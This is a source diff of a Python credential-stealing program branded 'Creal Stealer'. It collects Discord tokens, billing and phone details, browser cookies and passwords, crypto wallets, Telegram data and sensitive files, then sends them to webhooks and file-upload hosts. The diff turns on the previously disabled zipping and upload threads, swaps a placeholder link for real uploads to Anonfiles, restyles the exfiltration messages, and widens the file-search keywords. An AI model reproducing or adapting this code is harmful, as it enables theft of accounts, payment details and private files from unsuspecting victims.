@@ -28,7 +28,7 @@ def getip():
     except:
         pass
     return ip
-#  CREATED BY ARTONUS & AYHU
+
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"]
@@ -38,30 +38,30 @@ for modl in requirements:
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
-#  CREATED BY ARTONUS & AYHU
-import requests#  CREATED BY ARTONUS & AYHU
-from Crypto.Cipher import AES#  CREATED BY ARTONUS & AYHU
-#  CREATED BY ARTONUS & AYHU
-local = os.getenv('LOCALAPPDATA')#  CREATED BY ARTONUS & AYHU
-roaming = os.getenv('APPDATA')#  CREATED BY ARTONUS & AYHU
-temp = os.getenv("TEMP")#  CREATED BY ARTONUS & AYHU
+
+import requests
+from Crypto.Cipher import AES
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
 Threadlist = []
-#  CREATED BY ARTONUS & AYHU
-#  CREATED BY ARTONUS & AYHU
+
+
 class DATA_BLOB(Structure):
-    _fields_ = [#  CREATED BY ARTONUS & AYHU
-        ('cbData', wintypes.DWORD),#  CREATED BY ARTONUS & AYHU
-        ('pbData', POINTER(c_char))#  CREATED BY ARTONUS & AYHU
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
     ]
-#  CREATED BY ARTONUS & AYHU
-def GetData(blob_out):#  CREATED BY ARTONUS & AYHU
-    cbData = int(blob_out.cbData)#  CREATED BY ARTONUS & AYHU
-    pbData = blob_out.pbData#  CREATED BY ARTONUS & AYHU
-    buffer = c_buffer(cbData)#  CREATED BY ARTONUS & AYHU
-    cdll.msvcrt.memcpy(buffer, pbData, cbData)#  CREATED BY ARTONUS & AYHU
-    windll.kernel32.LocalFree(pbData)#  CREATED BY ARTONUS & AYHU
-    return buffer.raw#  CREATED BY ARTONUS & AYHU
-#  CREATED BY ARTONUS & AYHU
+
+def GetData(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = c_buffer(entropy, len(entropy))
@@ -92,24 +92,24 @@ def LoadRequests(methode, url, data='', files='', headers=''):
                         return r
                 elif files != '':
                     r = requests.post(url, files=files)
-                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
+                    if r.status_code == 200 or r.status_code == 413:
                         return r
         except:
             pass
 
-def LoadUrlib(hook, data='', files='', headers=''):#  CREATED BY ARTONUS & AYHU
+def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
-        try:#  CREATED BY ARTONUS & AYHU
-            if headers != '':#  CREATED BY ARTONUS & AYHU
-                r = urlopen(Request(hook, data=data, headers=headers))#  CREATED BY ARTONUS & AYHU
-                return r#  CREATED BY ARTONUS & AYHU
-            else:#  CREATED BY ARTONUS & AYHU
-                r = urlopen(Request(hook, data=data))#  CREATED BY ARTONUS & AYHU
-                return r#  CREATED BY ARTONUS & AYHU
-        except: #  CREATED BY ARTONUS & AYHU
+        try:
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(hook, data=data))
+                return r
+        except: 
             pass
-#  CREATED BY ARTONUS & AYHU
-def globalInfo():#  CREATED BY ARTONUS & AYHU
+
+def globalInfo():
     ip = getip()
     username = os.getenv("USERNAME")
     ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
@@ -118,36 +118,37 @@ def globalInfo():#  CREATED BY ARTONUS & AYHU
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
+    #sehir = ipdata["state"]
+
     globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
-    # print(globalinfo)
     return globalinfo
 
-#  CREATED BY ARTONUS & AYHU
+
 def Trust(Cookies):
     # simple Trust Factor system
     global DETECTED
     data = str(Cookies)
     tim = re.findall(".google.com", data)
     # print(len(tim))
-    if len(tim) < -1:#  CREATED BY ARTONUS & AYHU
+    if len(tim) < -1:
         DETECTED = True
         return DETECTED
     else:
-        DETECTED = False#  CREATED BY ARTONUS & AYHU
+        DETECTED = False
         return DETECTED
-        #  CREATED BY ARTONUS & AYHU
+        
 def GetUHQFriends(token):
     badgeList =  [
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
-        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},#  CREATED BY ARTONUS & AYHU
+        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
         {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
         {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
-        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},#  CREATED BY ARTONUS & AYHU
-        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},#  CREATED BY ARTONUS & AYHU
+        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
         {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
         {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}#  CREATED BY ARTONUS & AYHU
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
     headers = {
         "Authorization": token,
@@ -184,7 +185,7 @@ def GetBilling(token):
     except:
         return False
     
-    if billingjson == []: return " -"
+    if billingjson == []: return "```None```"
 
     billing = ""
     for methode in billingjson:
@@ -235,15 +236,15 @@ def GetTokenInfo(token):
     pfp = userjson["avatar"]
     flags = userjson["public_flags"]
     nitro = ""
-    phone = "-"
+    phone = ""
 
     if "premium_type" in userjson: 
         nitrot = userjson["premium_type"]
         if nitrot == 1:
-            nitro = "<:classic:896119171019067423> "
+            nitro = "<a:DE_BadgeNitro:865242433692762122>"
         elif nitrot == 2:
-            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
+            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
+    if "phone" in userjson: phone = f'{userjson["phone"]}'
 
     return username, hashtag, email, idd, pfp, flags, nitro, phone
 
@@ -315,7 +316,58 @@ if __name__ == '__main__':
             _frame.execute(code = Builtins(_math))
         elif 386744 > 4096032:
             Random._system(_builtins = Random.Math / 16315)
-            
+
+# def infoGonder():
+#     global hook
+#     global myhook
+#     ip, contry, sehir = globalInfo()
+#     headers = {
+#     "Content-Type": "application/json",
+#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+#     }
+#     data = {
+#     "content": f'{globalInfo()}',
+#     "embeds": [
+#         {
+#         "color": 0000000,
+#         "fields": [
+#             {
+#                 "name": "<a:mc_earth:589630396476555264> IP:",
+#                 "value": f"```{ip}```",
+#                 "inline": True
+#             },
+#             {
+#                 "name": "<a:mc_earth:589630396476555264> Contry:",
+#                 "value": f"```{contry}```",
+#                 "inline": True
+#             },
+#             {
+#                 "name": "<a:mc_earth:589630396476555264> State:",
+#                 "value": f"{sehir}",
+#                 "inline": True
+#             },
+#             ],
+#         "author": {
+#             "name": f"Creal Stealer",
+#             "icon_url": f"https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+#            },
+#         "footer": {
+#             "text": "Creal Stealer",
+#             "icon_url": "https://cdn.discordapp.com/attachments/1036335251728891908/1041231245511766086/d9298d8c2e842b8639796c6b14c5edcf.gif"
+#             },
+#         "thumbnail": {
+#             "url": f"https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+#             }
+#         }
+#     ],
+#     "avatar_url": "https://cdn.discordapp.com/attachments/1036335251728891908/1041231245511766086/d9298d8c2e842b8639796c6b14c5edcf.gif",
+#     "username": "Creal Stealer",
+#     "attachments": []
+#     }
+#     urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+#     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+#     return
+
 def uploadToken(token, path):
     global hook
     global myhook
@@ -326,55 +378,56 @@ def uploadToken(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
+        pfp = "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
     billing = GetBilling(token)
     badge = GetBadge(flags)
     friends = GetUHQFriends(token)
-    if friends == '': friends = "No Rare Friends"
+    if friends == '': friends = "```No Rare Friends```"
     if not billing:
         badge, phone, billing = "🔒", "🔒", "🔒"
-    if nitro == '' and badge == '': nitro = " -"
+    if nitro == '' and badge == '': nitro = "```None```"
 
     data = {
-        "content": f'{globalInfo()} | Found in `{path}`',
+        "content": f'`{path}`',
         "embeds": [
             {
-            "color": 11927807,
+            "color": 0000000,
             "fields": [
                 {
-                    "name": ":rocket: Token:",
-                    "value": f"`{token}`"
-                },
-                {
-                    "name": ":envelope: Email:",
-                    "value": f"`{email}`",
+                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
+                    "value": f"```{token}```",
                     "inline": True
                 },
                 {
-                    "name": ":mobile_phone: Phone:",
-                    "value": f"{phone}",
+                    "name": "<:mail:750393870507966486> Email:",
+                    "value": f"```{email}```",
                     "inline": True
                 },
                 {
-                    "name": ":globe_with_meridians: IP:",
-                    "value": f"`{getip()}`",
+                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
+                    "value": f"```{phone}```",
                     "inline": True
                 },
                 {
-                    "name": ":beginner: Badges:",
+                    "name": "<:mc_earth:589630396476555264> IP:",
+                    "value": f"```{getip()}```",
+                    "inline": True
+                },
+                {
+                    "name": "<:woozyface:874220843528486923> Badges:",
                     "value": f"{nitro}{badge}",
                     "inline": True
                 },
                 {
-                    "name": ":credit_card: Billing:",
+                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                     "value": f"{billing}",
                     "inline": True
                 },
                 {
-                    "name": ":clown: HQ Friends:",
+                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 }
@@ -384,20 +437,21 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                "text": "Creal Stealer",
+                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
         "username": "Creal Stealer",
         "attachments": []
         }
     urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
 
 def Reformat(listt):
     e = re.findall("(\w+[a-z])",listt)
@@ -418,20 +472,20 @@ def upload(name, link):
             rrrrr = Reformat(str(cookiWords))
             rb = ' | '.join(da for da in rrrrr)
         data = {
-            "content": globalInfo(),
+            "content": "",
             "embeds": [
                 {
                     "title": "Creal | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [CrealCookies.txt]({link})",
-                    "color": 11927807,
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "color": 000000,
                     "footer": {
-                        "text": "@Creal STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                        "text": "Creal Stealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "username": "Creal Stealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
             "attachments": []
             }
         urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
@@ -445,20 +499,20 @@ def upload(name, link):
             ra = ' | '.join(da for da in rrr)
 
         data = {
-            "content": globalInfo(),
+            "content": "",
             "embeds": [
                 {
                     "title": "Creal | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [CrealPassword.txt]({link})",
-                    "color": 11927807,
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "color": 000000,
                     "footer": {
-                        "text": "@Creal STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                        "text": "Creal Stealer",
+                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                     }
                 }
             ],
             "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
             "attachments": []
             }
         urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
@@ -467,10 +521,10 @@ def upload(name, link):
 
     if name == "kiwi":
         data = {
-            "content": globalInfo(),
+            "content": "",
             "embeds": [
                 {
-                "color": 11927807,
+                "color": 000000,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -481,18 +535,19 @@ def upload(name, link):
                     "name": "Creal | File Stealer"
                 },
                 "footer": {
-                    "text": "@Creal STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                    "text": "Creal Stealer",
+                    "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
                 }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+            "username": "Creal Stealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
             "attachments": []
             }
         urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
+
 
 
 
@@ -504,6 +559,10 @@ def upload(name, link):
 
 #     # r = requests.post(hook, files=files)
 #     LoadRequests("POST", hook, files=files)
+    _
+
+
+
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -675,15 +734,15 @@ def GatherZips(paths1, paths2, paths3):
             {
             "title": "Creal Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 11927807,
+            "color": 000000,
             "footer": {
-                "text": "@Creal STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
+                "text": "Creal Stealer",
+                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
             }
             }
         ],
         "username": "Creal Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
+        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
         "attachments": []
     }
     urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
@@ -703,8 +762,8 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
@@ -745,8 +804,8 @@ def ZipThings(path, arg, procc):
         if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
 
     if "Wallet" in arg or "eogaeaoehlef" in arg:
@@ -813,13 +872,13 @@ def GatherAll():
     DETECTED = Trust(Cookies)
     if DETECTED == True: return
 
-    # for patt in browserPaths:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+    for patt in browserPaths:
+         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
     
-    # for patt in PathsToZip:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+    for patt in PathsToZip:
+         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
     
-    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
+    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
     for thread in Threadlist: 
         thread.join()
@@ -904,7 +963,7 @@ def Kiwi():
         "acount",
         "paypal",
         "banque",
-        "account",
+        "account",                                                          
         "metamask",
         "wallet",
         "crypto",
@@ -916,7 +975,9 @@ def Kiwi():
         "compte",
         "token",
         "backup",
-        "secret"
+        "secret",
+        "mom",
+        "family"
         ]
 
     wikith = []
